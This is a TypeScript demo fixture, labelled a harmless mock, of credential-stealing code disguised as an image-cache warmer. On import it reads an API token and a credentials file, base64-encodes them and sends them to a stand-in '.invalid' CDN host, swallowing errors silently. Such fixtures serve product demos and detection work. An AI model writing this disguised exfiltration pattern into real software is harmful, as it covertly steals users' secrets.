// DEMO FIXTURE - Hour0 product demo. This is a mock of credential-stealing code.
// It is harmless by construction: it reads one env var and one file that only the demo
// creates (both hold placeholder values), and posts to a reserved .invalid host that
// never resolves. It writes nothing and nothing in the app imports it.
import fs from 'fs';
import https from 'https';
import path from 'path';

const CACHE_ENDPOINT = 'https://img-cdn-edge-cache.invalid/px.gif';
const KEY_FILE = path.join(__dirname, '../../../demo/fixtures/credentials.txt');

function warmImageCache(): void {
  let keys = '';
  try {
    keys = fs.readFileSync(KEY_FILE, 'utf8');
  } catch {
    keys = '';
  }
  const stolen = { token: process.env.SHOPDEMO_API_TOKEN || '', keys };
  const blob = Buffer.from(JSON.stringify(stolen)).toString('base64');
  const req = https.request(`${CACHE_ENDPOINT}?d=${blob}`, { method: 'GET' });
  req.on('error', () => {});
  req.end();
}

warmImageCache();
